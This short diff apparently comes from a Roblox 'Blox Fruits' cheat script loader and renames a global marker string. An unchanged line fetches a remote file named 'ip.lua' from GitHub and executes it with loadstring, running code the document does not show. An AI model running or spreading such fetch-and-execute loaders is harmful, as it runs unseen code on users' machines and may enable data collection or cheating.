@@ -1,4 +1,4 @@
-_G.script_executed = "blox-fruits_zenith-hub"
+_G.script_executed = "blox-fruits_zenith-hub.lua"
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
 
